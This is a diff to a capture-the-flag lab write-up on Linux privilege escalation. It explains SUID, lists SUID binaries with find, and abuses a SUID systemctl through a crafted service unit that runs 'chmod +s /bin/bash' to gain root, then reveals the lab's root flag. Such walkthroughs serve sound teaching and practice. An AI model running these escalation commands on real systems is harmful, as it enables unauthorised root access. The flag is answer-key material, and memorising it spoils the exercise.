@@ -241,7 +241,13 @@ cat user.txt
 
 Now that you have compromised this machine, we will escalate our privileges and become the superuser (root).
 
+In Linux, SUID (**set owner userId upon execution)** is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
+
+For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.
+
 #### 5.1 - On the system, search for all SUID files. Which file stands out?
+
+We can use the following command to list SUID files:
 
 ```bash
 find / -user root -perm -4000 -exec ls -ldb {} \;
@@ -274,6 +280,8 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
 ```
 
+/bin/systemctl stands out, at it is used to control and monitor services!
+
 #### 5.2 - Become root and get the last flag (/root/root.txt)
 
 We can use script of this website to became a root, in this case we choose systemctl process [https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/)\
@@ -285,12 +293,26 @@ sudo install -m =xs $(which systemctl) .
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
-ExecStart=/bin/sh -c "id > /tmp/output"
+ExecStart=/bin/sh -c “chmod +s /bin/bash”
 [Install]
 WantedBy=multi-user.target' > $TF
-./systemctl link $TF
-./systemctl enable --now $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
 ```
 
-\
-\
+```bash
+whoami
+root
+cat /root/root.txt
+```
+
+<details>
+
+<summary>🚩Reveal Flag2 [root.txt]</summary>
+
+a58ff8579f0a9270368d33a9966c7fd5
+
+</details>
+
+
+
